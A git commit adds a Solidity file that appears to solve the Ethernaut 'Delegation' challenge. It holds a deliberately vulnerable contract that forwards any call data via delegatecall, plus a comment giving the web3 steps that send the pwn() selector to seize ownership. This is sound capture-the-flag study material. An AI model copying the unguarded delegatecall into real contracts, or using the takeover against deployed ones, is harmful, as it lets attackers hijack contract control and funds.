05d2e728b716a89ef822a612662c8180fa2f1c33
Manikanta Nynala <90610801+manikantanynala97@users.noreply.github.com>
2023-01-10 17:09:59 +0530

    Create 06-Delegate.sol

---
+++ 06-Delegate.sol
@@ -0,0 +1,43 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Delegate {
+
+  address public owner;
+
+  constructor(address _owner) {
+    owner = _owner;
+  }
+
+  function pwn() public {
+    owner = msg.sender;
+  }
+}
+
+contract Delegation {
+
+  address public owner;
+  Delegate delegate;
+
+  constructor(address _delegateAddress) {
+    delegate = Delegate(_delegateAddress);
+    owner = msg.sender;
+  }
+
+  fallback() external {
+    (bool result,) = address(delegate).delegatecall(msg.data);
+    if (result) {
+      this;
+    }
+  }
+}
+
+contract DelegateAttack
+{
+    /*
+
+     signature = web3.eth.abi.encodeFunctionSignature("pwn()")
+     await contract.sendTransaction({ from: player, data: signature })
+     await contract.owner() === player
+    */
+}
